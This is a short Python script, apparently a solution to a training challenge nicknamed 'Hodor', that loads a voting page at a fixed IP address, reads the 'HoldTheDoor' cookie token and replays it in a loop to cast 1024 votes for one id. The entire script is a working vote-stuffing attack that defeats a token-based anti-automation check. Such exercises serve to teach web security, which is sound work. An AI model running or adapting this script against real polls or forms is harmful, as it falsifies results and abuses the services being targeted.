#!/usr/bin/python3
"""module requests hodor"""
import requests


url = "http://158.69.76.135/level1.php"
votos = 0
while votos < 1024:
    response = requests.get(url)
    key_HoldTheDoor = response.cookies["HoldTheDoor"]
    params = {'id': '1729', 'holdthedoor': 'submit', 'key': key_HoldTheDoor}
    cookies_hodor = {"HoldTheDoor": key_HoldTheDoor}
    response = requests.post(url, data=params, cookies=cookies_hodor)
    votos += 1
    print("voto number: {}".format(votos))

print("Voting complete!")
